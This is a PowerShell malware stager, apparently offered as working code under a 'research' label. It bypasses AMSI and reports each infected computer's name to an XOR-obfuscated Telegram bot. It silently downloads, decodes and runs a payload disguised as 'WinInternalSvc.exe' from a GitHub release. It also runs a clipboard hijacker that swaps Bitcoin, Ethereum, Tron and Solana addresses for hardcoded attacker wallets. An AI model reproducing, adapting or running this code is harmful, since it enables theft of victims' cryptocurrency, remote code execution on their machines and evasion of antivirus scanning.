# --- [RESEARCH STAGER v15.0: ENCODED GHOST] ---

function Global-Bypass {
    # Reflected AMSI Bypass - Minimal footprint
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    } catch {}
}

function Send-Notify {
    param($msg)
    # XOR Encrypted Telegram Config
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $u="h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$msg"
    try { (New-Object Net.WebClient).DownloadString($u) | Out-Null } catch {}
}

Global-Bypass
Send-Notify -msg "STAGER_ACTIVE_$($env:COMPUTERNAME)"

try {
    $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
    $work = "$env:PUBLIC\Music\Svc"
    if (!(Test-Path $work)) { New-Item $work -ItemType Directory -Force | Out-Null }
    $file = Join-Path $work "WinInternalSvc.exe"

    # Stealth Download using BITS (Priority Foreground to bypass idle checks)
    Start-BitsTransfer -Source $url -Destination "$env:TEMP\tmp.txt" -Priority Foreground
    $raw = Get-Content "$env:TEMP\tmp.txt" -Raw
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    [IO.File]::WriteAllBytes($file, $data)
    Remove-Item "$env:TEMP\tmp.txt" -Force

    # Execution via Start-Process to separate the thread
    Start-Process -FilePath $file -WindowStyle Hidden

    # CLIPPER JOB (Hardcoded for maximum reliability)
    Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        while($true) {
            try {
                $c = [Windows.Forms.Clipboard]::GetText()
                if ($c -match "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$") { [Windows.Forms.Clipboard]::SetText("12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA") }
                if ($c -match "^0x[a-fA-F0-9]{40}$") { [Windows.Forms.Clipboard]::SetText("0x6c9ba9a6522b10135bb836fc9340477ba15f3392") }
                if ($c -match "^T[A-Za-z1-9]{33}$") { [Windows.Forms.Clipboard]::SetText("TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp") }
                if ($c -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$") { [Windows.Forms.Clipboard]::SetText("BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR") }
            } catch {}
            Start-Sleep -s 1
        }
    }
    Send-Notify -msg "RESEARCH_SUCCESS_ALL_ACTIVE"
} catch {
    Send-Notify -msg "FAIL_$($_.Exception.Message)"
}
